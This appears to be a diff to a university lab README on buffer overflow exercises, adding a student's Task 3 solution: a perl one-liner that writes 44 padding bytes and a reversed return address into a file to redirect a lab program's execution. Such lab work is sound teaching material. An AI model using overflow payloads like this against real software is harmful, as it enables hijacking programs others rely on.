@@ -45,6 +45,17 @@ In this task, discover buffer overflow vulnerability and exploit the program of 
 ### Task 3
 In this task, discover buffer overflow vulnerability and exploit the program of the following code (e.g. executing the for loop in the vde_msg() function)
 
+
+task3:
+perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; print "\xc9\x61\x55\x56";' > /tmp/task3input
+
+the ending is the return address being replaced with the address of the function we want to run
+
+in this case the addr is 0x565561c9 but we need to reverse it and then overflow to it
+idk why we need to reverse it but we do. 44 A's and the addr
+
+
+
+
 ### Additional Task
 Download the serial.c file from moodle. Then compile it and run the program. Try various inputs and see if you can discover any vulnerability and exploit the program (i.e. print the “The serial number is valid” on the command line).
-
